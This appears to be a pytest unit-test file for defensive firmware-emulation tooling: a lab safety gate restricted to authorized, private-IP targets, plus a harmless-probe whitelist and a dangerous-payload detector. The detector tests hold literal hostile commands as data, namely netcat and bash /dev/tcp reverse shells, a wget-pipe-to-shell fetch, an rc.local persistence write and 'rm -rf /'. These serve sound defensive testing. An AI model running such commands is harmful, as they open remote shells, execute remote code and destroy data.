"""Unit tests for the M8 dynamic-validation tools."""

from __future__ import annotations

import pytest

from tools.emulation.firmae_wrap import detect_firmae, run_firmae
from tools.emulation.probes import (
    assert_harmless,
    build_connectivity_probe,
    build_marker_probe,
    detect_dangerous_payload,
    is_harmless_probe,
    record_startup_check,
)
from tools.emulation.qemu_system import plan_l2_bootstrap, validate_network
from tools.emulation.qemu_user import detect_qemu, run_l1_load_check
from tools.emulation.safety_gate import GateResult, evaluate_gate, validate_target_ip

PRIVATE_IP = "192.168.1.100"
PUBLIC_IP = "8.8.8.8"


# ---------------------------------------------------------------------------
# safety gate
# ---------------------------------------------------------------------------


def test_gate_allows_when_all_pass() -> None:
    result = evaluate_gate(
        authorized=True, local_lab=True, target_ip=PRIVATE_IP, baseline_ready=True
    )
    assert result.allowed is True
    assert result.reason is None


def test_gate_aborts_public_ip() -> None:
    result = evaluate_gate(
        authorized=True, local_lab=True, target_ip=PUBLIC_IP, baseline_ready=True
    )
    assert result.allowed is False
    assert result.is_abort is True
    assert "private_network" in result.reason
    assert result.gates["private_network"] is False


def test_gate_aborts_unauthorized() -> None:
    result = evaluate_gate(
        authorized=False, local_lab=True, target_ip=PRIVATE_IP, baseline_ready=True
    )
    assert result.allowed is False
    assert "authorized" in result.reason


def test_gate_aborts_no_baseline() -> None:
    result = evaluate_gate(
        authorized=True, local_lab=True, target_ip=PRIVATE_IP, baseline_ready=False
    )
    assert result.allowed is False
    assert "baseline_ready" in result.reason


def test_gate_result_serializable() -> None:
    result = evaluate_gate(
        authorized=True, local_lab=True, target_ip=PRIVATE_IP, baseline_ready=True
    )
    assert isinstance(result.to_dict(), dict)
    assert isinstance(result, GateResult)


def test_validate_target_ip_rejects_public() -> None:
    with pytest.raises(ValueError):
        validate_target_ip(PUBLIC_IP)


def test_validate_target_ip_accepts_private() -> None:
    validate_target_ip(PRIVATE_IP)  # must not raise


# ---------------------------------------------------------------------------
# probes
# ---------------------------------------------------------------------------


def test_harmless_probe_whitelist() -> None:
    assert is_harmless_probe(["touch", "/tmp/lab_marker"]) is True
    assert is_harmless_probe(["id"]) is True
    assert is_harmless_probe(["nc", "-e", "/bin/sh"]) is False


def test_detect_dangerous_payload() -> None:
    assert detect_dangerous_payload("nc -e /bin/sh 1.2.3.4 4444")
    assert detect_dangerous_payload("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")
    assert detect_dangerous_payload("wget http://x.sh | sh")
    assert detect_dangerous_payload("echo x >> /etc/rc.local")
    assert detect_dangerous_payload("touch /tmp/lab_marker") == []


def test_assert_harmless_rejects_dangerous() -> None:
    with pytest.raises(ValueError):
        assert_harmless("rm -rf /")


def test_connectivity_and_marker_probes() -> None:
    probe = build_connectivity_probe(PRIVATE_IP, 80)
    assert probe[0] == "curl"
    assert "--max-time" in probe
    marker = build_marker_probe("touch_marker")
    assert marker == ["touch", "/tmp/lab_marker"]


def test_startup_repeatability() -> None:
    ok = record_startup_check(probe_name="curl", cold_start_ok=True, hot_start_ok=True)
    assert ok["repeatable"] is True
    bad = record_startup_check(probe_name="curl", cold_start_ok=True, hot_start_ok=False)
    assert bad["repeatable"] is False


# ---------------------------------------------------------------------------
# qemu / firmae (degrade gracefully when tools are absent)
# ---------------------------------------------------------------------------


def test_detect_qemu_unknown_arch() -> None:
    assert detect_qemu("nonexistent-arch") is None


def test_l1_load_check_skips_without_qemu(tmp_path) -> None:
    result = run_l1_load_check(tmp_path, "mipsel")
    assert result["status"] == "skipped"
    assert "limitation" in result


def test_qemu_system_validate_private_and_reject_public() -> None:
    assert validate_network(PRIVATE_IP)["private"] is True
    with pytest.raises(ValueError):
        validate_network(PUBLIC_IP)


def test_plan_l2_skips_without_system_qemu() -> None:
    result = plan_l2_bootstrap(PRIVATE_IP, port=80)
    # On a host without qemu-system, this degrades to skipped; if present,
    # it returns planned. Both are acceptable and must be private-safe.
    assert result["status"] in ("skipped", "planned")
    assert result["network"]["private"] is True


def test_firmae_detect_none_and_skip(tmp_path) -> None:
    assert detect_firmae() is None
    result = run_firmae(tmp_path / "fw.bin", PRIVATE_IP)
    assert result["status"] == "skipped"
    assert "limitation" in result
